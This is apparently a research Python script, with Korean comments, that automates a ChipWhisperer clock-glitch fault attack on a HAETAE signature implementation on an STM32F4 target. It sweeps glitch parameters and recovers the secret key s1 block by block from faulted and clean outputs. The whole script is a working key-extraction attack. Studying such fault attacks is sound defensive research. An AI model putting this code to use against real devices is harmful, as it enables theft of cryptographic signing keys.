# -*- coding: utf-8 -*-
# T1 자율 클럭글리치 드라이버 (독립 실행, aifia). 노트북 없이 scope 직접 연결(EXP7-a/t2_driver 복제).
#   c·s(3-반복 루프)를 글리치로 clean loop-exit → 블록별 clean 스킵 → 2-trace 차분으로 블록 복원.
#   블록별 누적(PartialAccumulator 개념)으로 3블록 모으면 s1 768/768 완전복원.
# 실행: (Jupyter 커널이 scope 를 놓은 상태에서)  python t1_auto.py
#   전제 hex: haetae-JIG-T1-fused-CW308_STM32F4.hex (AXISA_JIG=1 T1_CS_ZEROINIT=1)
import sys, os, json, time, csv, random, collections

NBDIR = r'C:/Users/NSRSGW/ChipWhisperer/chipwhisperer/jupyter/courses/fault_haetae_cm'
FW    = r'C:/Users/NSRSGW/ChipWhisperer/chipwhisperer/firmware/mcu/simpleserial-haetae/'
sys.path.insert(0, NBDIR)
from haetae_recover import read_z1raw, read_cpoly, read_s1ntt
from haetae_recover_t1 import recover_s1_from_two_traces, verify_s1

# ---- config (argv 또는 기본: 분석 기반 승리 shape + 전 c·s 스캔) ----
CFG = {'N': 1200, 'ext_lo': 0, 'ext_hi': None,       # ext_hi=None → 측정 WIN 클램프
       'w_lo': 55, 'w_hi': 68, 'o_lo': 12, 'o_hi': 14, 'rep': 2,
       'hex': 'haetae-JIG-T1-fused-CW308_STM32F4.hex', 'out': 't1_auto'}
if len(sys.argv) > 1:
    CFG.update(json.load(open(sys.argv[1], encoding='utf-8')))

PLATFORM = 'CW308_STM32F4'
FL = {'NONE':0,'SEED':1,'SIGNBIT':2,'UNPACK':3,'LSB':4,'CS':5,'ADDY':6,'REJECT':7}
TRIG_POINT = FL['CS']
SIGN_MS = 15000
LOG_CSV = os.path.join(NBDIR, CFG['out'] + '.csv')
SUM_JSON = os.path.join(NBDIR, CFG['out'] + '_summary.json')
PROG = os.path.join(NBDIR, CFG['out'] + '_progress.txt')

import chipwhisperer as cw
import logging; logging.getLogger('ChipWhisperer').setLevel(logging.ERROR)

# ---------- setup (Setup_Generic + EXP7-a 복제) ----------
scope = cw.scope(name='Husky')
target = cw.target(scope, cw.targets.SimpleSerial)
prog = cw.programmers.STM32FProgrammer
scope.default_setup()
def reset_target():
    scope.io.nrst='low'; time.sleep(0.05); scope.io.nrst='high_z'; time.sleep(0.05)
scope.clock.clkgen_freq=7.37e6; scope.clock.adc_mul=1; scope.io.hs2='clkgen'; time.sleep(0.2)

def ss_echo(t=3000):
    target.flush(); target.simpleserial_write('e', bytearray())
    r=target.simpleserial_read('r',16,timeout=t); return bytes(r) if r else None
def ss_trig(pt):
    target.flush(); target.simpleserial_write('T', bytes([pt]))
    return target.simpleserial_read('r',1,timeout=3000)
def flash(hexname):
    cw.program_target(scope, prog, FW+hexname); reset_target(); time.sleep(0.5); target.flush()
def recover_target():
    reset_target(); time.sleep(0.5); target.flush()
    try: ss_trig(TRIG_POINT)
    except Exception: pass
def set_glitch(d,w,o):
    scope.glitch.ext_offset=int(d); scope.glitch.width=int(w); scope.glitch.offset=int(o)
def ss_jig_t1(mode, timeout=None):
    target.flush(); target.simpleserial_write('J', bytes([mode & 3]))
    tmo=(timeout or SIGN_MS) if mode==0 else 1000
    r=target.simpleserial_read_witherrors('r',16,timeout=tmo,glitch_timeout=400)
    if (not r['valid']) or r['payload'] is None: return None
    return bytes(r['payload'])
def reprime():
    recover_target(); return ss_jig_t1(0)

# ---------- flash + prime + 동일-nonce 사전검사 + WIN + glitch mode ----------
scope.io.hs2='clkgen'
flash(CFG['hex']); recover_target(); ss_trig(FL['CS'])
D0 = ss_jig_t1(0); assert D0 is not None, 'prime 실패'
Z_CLEAN = read_z1raw(target); C_CLEAN = read_cpoly(target); S1_CLEAN = read_s1ntt(target)
# 무글리치 fire_t1 == prime z1 (동일 nonce 보장 사전검사; 글리치 모듈 미사용)
dchk = ss_jig_t1(2); zchk = read_z1raw(target)
assert dchk==D0 and zchk==Z_CLEAN, '무글리치 fire_t1 != prime z1 (fire_t1/저장 상태 확인)'
# c·s WIN 측정
scope.adc.basic_mode='rising_edge'
try: scope.trigger.triggers='tio4'
except Exception: pass
scope.adc.timeout=6; reprime()
scope.arm(); target.simpleserial_write('J', bytes([2]))
try: scope.capture()
except Exception: pass
target.simpleserial_read_witherrors('r',16,timeout=3000,glitch_timeout=400)
WIN=int(scope.adc.trig_count)
scope.glitch.enabled=True; scope.glitch.clk_src='pll'; scope.glitch.output='clock_xor'
scope.glitch.trigger_src='ext_single'; scope.glitch.repeat=1
scope.io.hs2='glitch'; scope.adc.timeout=0.25
reprime()
EHI = CFG['ext_hi'] if CFG['ext_hi'] else (WIN if 50 < WIN < 300000 else 60000)
print('SETUP ok | prime==fire_t1 (nonce fixed) | WIN=%d | ext %d~%d | PSS=%d'
      % (WIN, CFG['ext_lo'], EHI, scope.glitch.phase_shift_steps), flush=True)

# ---------- search + block accumulation ----------
block_cov  = [False, False, False]    # 각 비밀블록 s1[i] 가 어떤 샷에서든 clean(≥254/256) 복원됐는가
block_best = [0, 0, 0]                # 블록별 지금까지 최고 일치수 (근접도 파악)
block_at   = [None, None, None]       # 각 블록 최고치를 준 파라미터
cnt = collections.OrderedDict(golden=0, T1_leak=0, other=0, mute=0)
best = 0.0; leaks = []
newlog = not os.path.exists(LOG_CSV)
logf = open(LOG_CSV,'a',newline=''); logw=csv.writer(logf)
if newlog: logw.writerow(['ext','width','offset','rep','class','rate','blocks','digest']); logf.flush()
t0=time.time(); N=int(CFG['N'])
BANDS = CFG.get('ext_bands')   # [[lo,hi],...] 주어지면 그 밴드들만 dense 스캔(블록별 clean 시작점 집중)
for i in range(N):
    if BANDS:
        _lo,_hi = random.choice(BANDS); e = random.randint(int(_lo), int(_hi))
    else:
        e = random.randint(int(CFG['ext_lo']), int(EHI))
    w=random.randint(CFG['w_lo'],CFG['w_hi'])
    o=random.randint(CFG['o_lo'],CFG['o_hi']); rep=int(CFG['rep'])
    if scope.adc.state: reprime()
    set_glitch(e,w,o); scope.glitch.repeat=rep
    scope.arm(); target.flush(); target.simpleserial_write('J', bytes([2]))
    try: scope.capture()
    except Exception: pass
    r=target.simpleserial_read_witherrors('r',16,timeout=1000,glitch_timeout=400)
    d=bytes(r['payload']) if (r['valid'] and r['payload'] is not None) else None
    cls='mute'; rate=0.0; bstr=''
    if d is None:
        cls='mute'; reprime()
    elif d==D0:
        cls='golden'
    else:
        z1=read_z1raw(target)
        rr=recover_s1_from_two_traces(Z_CLEAN, z1, C_CLEAN)
        if rr.get('ln_exact'):
            v=verify_s1(rr.get('s1ntt'), S1_CLEAN, C_CLEAN)
            rate=v['rate']; best=max(best,rate); bstr=str(v['block_match'])
            newblk=False
            for bi in range(3):
                if v['block_match'][bi] > block_best[bi]:
                    block_best[bi]=v['block_match'][bi]; block_at[bi]=(e,w,o,rep)
                if v['block_match'][bi] >= 254 and not block_cov[bi]:
                    block_cov[bi]=True; newblk=True
            if v['full']:
                cls='T1_leak'; leaks.append((e,w,o,rep,round(rate,3)))
                print('★ T1_leak(단일샷 768/768) ext=%d w=%d o=%d rep=%d'%(e,w,o,rep), flush=True)
            elif rate>0.05:
                cls='other'
                if newblk: print('· 블록복원 ext=%d rate=%.1f%% blocks=%s cov=%d/3'%(e,100*rate,bstr,sum(block_cov)), flush=True)
            else:
                cls='other'
        else:
            cls='other'
    cnt[cls]=cnt.get(cls,0)+1
    logw.writerow([e,w,o,rep,cls,'%.3f'%rate,bstr,d.hex() if d else '']); logf.flush()
    with open(PROG,'w',encoding='utf-8') as pf:
        pf.write('shot=%d/%d elapsed=%ds\ncounts=%s\nbest_single=%.1f%%\nblock_best=%s /256\nblock_cov=%s (%d/3)\nblock_at=%s\n'
                 %(i+1,N,int(time.time()-t0),dict(cnt),100*best,block_best,block_cov,sum(block_cov),block_at))
    if sum(block_cov)==3:
        print('★★ 누적 완전복원: 3블록 모두 clean 복원 → s1 768/768 (누적 다중결함)', flush=True); break
logf.close(); scope.glitch.repeat=1
dur=time.time()-t0
summary={'N':N,'dur_s':round(dur,1),'per_shot_s':round(dur/max(i+1,1),2),'WIN':WIN,
         'ext':[CFG['ext_lo'],EHI],'shape':{'w':[CFG['w_lo'],CFG['w_hi']],'o':[CFG['o_lo'],CFG['o_hi']],'rep':CFG['rep']},
         'counts':dict(cnt),'best_single_rate':round(best,3),
         'block_cov':block_cov,'block_best':block_best,'blocks_recovered':sum(block_cov),'block_at':block_at,
         'accumulated_full': sum(block_cov)==3, 'single_shot_leaks':leaks[:10]}
json.dump(summary, open(SUM_JSON,'w',encoding='utf-8'), ensure_ascii=False, indent=1)
try: scope.dis()
except Exception: pass
print('RESULT', json.dumps(summary, ensure_ascii=False), flush=True)
